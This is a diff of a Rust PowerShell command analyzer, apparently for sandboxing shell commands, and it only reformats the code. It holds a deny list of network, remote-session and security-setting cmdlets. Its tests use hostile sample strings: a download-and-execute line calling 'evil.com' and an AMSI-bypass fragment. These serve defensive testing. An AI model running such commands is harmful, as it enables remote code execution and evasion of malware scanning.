@@ -7,14 +7,33 @@ use super::base::{ShellAnalysisContext, ShellAnalysisResult, ShellAnalyzer, Shel
 const SHELL_TYPE: ShellType = ShellType::PowerShell;
 
 const DENIED_COMMANDS: &[&str] = &[
-    "Start-Process", "Stop-Process", "Get-WmiObject", "Get-WinEvent",
-    "Invoke-WmiMethod", "Register-WmiEvent", "Remove-WmiObject", "Set-WmiInstance",
-    "Invoke-Expression", "Invoke-Command", "Invoke-CimMethod",
-    "Invoke-WebRequest", "Invoke-RestMethod",
-    "Enter-PSSession", "Exit-PSSession", "New-PSSession", "Remove-PSSession",
-    "Set-ExecutionPolicy", "Set-MpPreference", "Unblock-File",
-    "New-Service", "Set-Service", "Restart-Service", "Stop-Service",
-    "New-ItemProperty", "Set-ItemProperty", "Remove-ItemProperty",
+    "Start-Process",
+    "Stop-Process",
+    "Get-WmiObject",
+    "Get-WinEvent",
+    "Invoke-WmiMethod",
+    "Register-WmiEvent",
+    "Remove-WmiObject",
+    "Set-WmiInstance",
+    "Invoke-Expression",
+    "Invoke-Command",
+    "Invoke-CimMethod",
+    "Invoke-WebRequest",
+    "Invoke-RestMethod",
+    "Enter-PSSession",
+    "Exit-PSSession",
+    "New-PSSession",
+    "Remove-PSSession",
+    "Set-ExecutionPolicy",
+    "Set-MpPreference",
+    "Unblock-File",
+    "New-Service",
+    "Set-Service",
+    "Restart-Service",
+    "Stop-Service",
+    "New-ItemProperty",
+    "Set-ItemProperty",
+    "Remove-ItemProperty",
 ];
 
 pub const DANGEROUS_PATTERNS: &[&str] = &[
@@ -92,12 +111,14 @@ impl PowerShellAnalyzer {
     fn resolve_policy(&self, policy: &ShellPolicy) -> ResolvedShellPolicy {
         ResolvedShellPolicy {
             allowed_commands: policy.allowed_commands.clone().unwrap_or_default(),
-            denied_commands: policy.denied_commands.clone().unwrap_or_else(|| {
-                DENIED_COMMANDS.iter().map(|s| s.to_string()).collect()
-            }),
-            dangerous_patterns: policy.dangerous_patterns.clone().unwrap_or_else(|| {
-                DANGEROUS_PATTERNS.iter().map(|s| s.to_string()).collect()
-            }),
+            denied_commands: policy
+                .denied_commands
+                .clone()
+                .unwrap_or_else(|| DENIED_COMMANDS.iter().map(|s| s.to_string()).collect()),
+            dangerous_patterns: policy
+                .dangerous_patterns
+                .clone()
+                .unwrap_or_else(|| DANGEROUS_PATTERNS.iter().map(|s| s.to_string()).collect()),
             allow_pipe: policy.allow_pipe.unwrap_or(true),
             allow_redirect: policy.allow_redirect.unwrap_or(true),
         }
@@ -120,9 +141,7 @@ impl PowerShellAnalyzer {
             no_assign
         };
 
-        let first = no_call_op
-            .split([' ', ';', '|'])
-            .next()?;
+        let first = no_call_op.split([' ', ';', '|']).next()?;
 
         if first.is_empty() {
             return None;
@@ -159,9 +178,7 @@ impl ShellAnalyzer for PowerShellAnalyzer {
             }
         };
 
-        if !policy.allowed_commands.is_empty()
-            && !policy.allowed_commands.contains(&primary)
-        {
+        if !policy.allowed_commands.is_empty() && !policy.allowed_commands.contains(&primary) {
             return ShellAnalysisResult {
                 allowed: false,
                 reason: Some(format!("Command not in whitelist: {primary}")),
@@ -277,23 +294,38 @@ mod tests {
 
     #[test]
     fn test_denies_iex_alias() {
-        let result = analyze("iex (New-Object Net.WebClient).DownloadString('http://evil.com')", &empty_policy());
+        let result = analyze(
+            "iex (New-Object Net.WebClient).DownloadString('http://evil.com')",
+            &empty_policy(),
+        );
         assert!(!result.allowed);
-        assert!(result.reason.as_ref().unwrap().contains("Invoke-Expression"));
+        assert!(result
+            .reason
+            .as_ref()
+            .unwrap()
+            .contains("Invoke-Expression"));
     }
 
     #[test]
     fn test_alias_resolution_iex() {
         let result = analyze("iex some_command", &empty_policy());
         assert!(!result.allowed);
-        assert!(result.reason.as_ref().unwrap().contains("Invoke-Expression"));
+        assert!(result
+            .reason
+            .as_ref()
+            .unwrap()
+            .contains("Invoke-Expression"));
     }
 
     #[test]
     fn test_alias_resolution_iwr() {
         let result = analyze("iwr http://example.com", &empty_policy());
         assert!(!result.allowed);
-        assert!(result.reason.as_ref().unwrap().contains("Invoke-WebRequest"));
+        assert!(result
+            .reason
+            .as_ref()
+            .unwrap()
+            .contains("Invoke-WebRequest"));
     }
 
     #[test]
@@ -304,7 +336,10 @@ mod tests {
 
     #[test]
     fn test_denies_amsi_bypass() {
-        let result = analyze("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", &empty_policy());
+        let result = analyze(
+            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
+            &empty_policy(),
+        );
         assert!(!result.allowed);
     }
 
